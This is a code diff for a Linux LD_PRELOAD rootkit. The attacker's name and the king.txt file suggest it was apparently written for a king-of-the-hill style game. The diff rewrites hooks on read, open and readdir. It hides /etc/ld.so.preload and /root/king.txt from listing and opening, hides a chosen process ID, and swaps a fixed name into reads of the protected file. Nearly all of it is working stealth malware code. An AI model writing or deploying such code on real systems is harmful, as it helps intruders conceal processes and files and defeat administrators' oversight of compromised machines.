@@ -44,24 +44,22 @@ ssize_t read(int fd, void *buf, size_t count) {
             if (is_reading_hidden_file) {
                 return orig_read(fd, buf, count);
             } else {
-              is_reading_hidden_file = 1; // Set flag to avoid recursion
-              const char *message = "profxadke\n\0";
-              size_t msg_len = strlen(message);
+                is_reading_hidden_file = 1; // Set flag to avoid recursion
+                const char *message = "profxadke\n\0";
+                size_t msg_len = strlen(message);
 
-              // Adjust count to message length if necessary
-              if (count > msg_len) {
-                  count = msg_len;
-              }; count = 11;
+                // Adjust count to message length if necessary
+                if (count > msg_len) {
+                    count = msg_len;
+                }; count = 11;
 
-              // Replace the message to the buffer.
-              // is_reading_hidden_file = 0; // Reset flag after reading
-              memset(buf, 0, sizeof(buf));
-              strncpy(buf, message, count);
-              // buf[len] = -1;
-              // buf[len + 1] = '\0';
-              return count; // Return the number of bytes written
-           }
+                // Replace the message in the buffer
+                memset(buf, 0, count);
+                strncpy(buf, message, count);
 
+                // is_reading_hidden_file = 0; // Reset flag after reading
+                return count; // Return the number of bytes written
+            }
         }
 
         // Hide the contents of /etc/ld.so.preload
@@ -79,8 +77,8 @@ int open(const char *pathname, int flags, ...) {
         orig_open = dlsym(RTLD_NEXT, "open");
     }
 
-    // Hide the file descriptor for /etc/ld.so.preload
-    if (strcmp(pathname, target_file) == 0) {
+    // Hide the file descriptor for /etc/ld.so.preload and /root/king.txt
+    if (strcmp(pathname, target_file) == 0 || strcmp(pathname, hidden_file) == 0) {
         errno = EACCES; // Return permission error to prevent opening the file
         return -1;
     }
@@ -118,7 +116,7 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
     return orig_unlinkat(dirfd, pathname, flags);
 }
 
-// Intercept readdir to hide specific processes
+// Intercept readdir to hide specific processes and files
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
         orig_readdir = dlsym(RTLD_NEXT, "readdir");
@@ -126,16 +124,17 @@ struct dirent *readdir(DIR *dirp) {
 
     struct dirent *entry;
     while ((entry = orig_readdir(dirp)) != NULL) {
-          if (strstr(entry->d_name, "rootkit") == NULL &&
-            strstr(entry->d_name, "ld.so.preload") == NULL &&
-            strstr(entry->d_name, "king.txt") == NULL) {
-            return entry;
-          } else {
-            // Hide processes with the specified PID
-            if (entry->d_type == DT_DIR && atoi(entry->d_name) == target_pid) {
-                continue; // Skip this entry
-            }
-            return entry; // Return non-hidden entries
-          }
+        // Hide processes with the specified PID
+        if (entry->d_type == DT_DIR && atoi(entry->d_name) == target_pid) {
+            continue; // Skip this entry
+        }
+
+        // Hide /etc/ld.so.preload and /root/king.txt
+        if (strcmp(entry->d_name, "ld.so.preload") == 0 || strcmp(entry->d_name, "king.txt") == 0) {
+            continue; // Skip this entry
+        }
+
+        return entry; // Return non-hidden entries
     }
-    return NULL;}
+    return NULL;
+}
